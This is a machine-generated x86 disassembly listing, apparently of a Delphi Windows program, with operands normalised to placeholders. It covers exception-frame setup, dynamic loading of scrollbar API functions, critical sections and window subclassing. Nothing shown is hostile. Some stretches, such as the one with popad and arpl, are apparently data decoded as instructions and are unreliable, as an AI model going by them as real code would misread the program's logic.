call sub_40b7b4
call sub_4039e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425bf6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a30
lea eax [ ebp - 0x8 ]
call sub_4056c4
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056dc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425c10
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405738
xor eax eax
push ebp
push sub_425c5f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4056dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c66
lea eax [ ebx + 0xc ]
call sub_4056c4
sub_425c6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_425d01
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403ffc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4259f8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d08
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
call sub_42550c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42553c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4256dc
sub_425d2c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_424454
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_424454
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413e34
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_424454
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413e34
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413e34
sub_425db8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_4254cc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403258
mov eax [ esi + 0x14 ]
call sub_403258
mov eax [ esi + 0x10 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4056c4
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_425e0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425e43
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e4a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_425e54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425e79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e80
retn
sub_425e8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425ebd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ec4
retn
mov eax [ rw-data ]
call sub_403258
sub_425ed0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_425f04
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_425f2c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_4261ae
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4261d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261dc
retn
sub_42627d
popad
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ ebx ] al
inc edx
add [ ebx ] dh
inc edx
add [ eax + 0x63 ] al
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_4262c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_426304
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42635c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426381
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426388
retn
sub_426394
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42634c
xor eax eax
push ebp
push sub_42654b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426552
mov eax [ rw-data ]
call sub_426354
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_426554
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42634c
xor eax eax
push ebp
push sub_426907
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42690e
mov eax [ rw-data ]
call sub_426354
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426cb8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_426ce0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426d28
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d2f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403258
call sub_426394
cmp [ rw-data ] 0x0
jg r-xdata
sub_426d50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426d75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d7c
retn
sub_426d88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426dad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426db4
retn
sub_426dc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426de5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426dec
retn
sub_426df8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e24
retn
sub_426e30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e5c
retn
sub_426e68
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e94
retn
sub_426ed1
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_426ef9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f00
retn
sub_426f14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426f39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f40
retn
sub_426f4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426f71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f78
retn
sub_427650
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45a6fc
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_456c9c
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_456c9c
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_45a400
mov edi eax
mov eax ebx
call sub_45a3e4
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_45a3cc
mov edi eax
mov eax ebx
call sub_45a418
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_427704
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_427650
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42776c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a2c
mov [ esi + 0x30 ] 0x1
push esi
push sub_427848
call sub_41aabc
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4277b4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
call sub_41ab54
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4277e8
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45d0f0
mov cl 0x1
sub_427810
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034a8
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_427848
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427872
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4278e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_453ae8
mov [ ebp - 0x14 ] eax
call sub_453a04
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4279a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c9e0
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_427975
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42797c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ca3c
retn
sub_42797c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4279aa
mov eax [ ebp - 0x14 ]
call sub_453b9c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_453a0c
retn
sub_4279dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_427650
sub_427a60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42776c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_427ad9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403258
mov eax [ esi + 0x58 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4277b4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_427b14
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_42819c
mov eax edi
mov si 0xffed
call sub_403454
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_427b3c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_427894
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_427b80 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_427b14
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403454
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403454
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403454
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403454
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403454
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_427c38
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_427cc0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_427cf2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_417d0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427cf9
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_427cfc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419da4
push ebx
push sub_427cc0
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_427d40
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fa8
test esi esi
je r-xdata
pop esi
pop ebx
retn
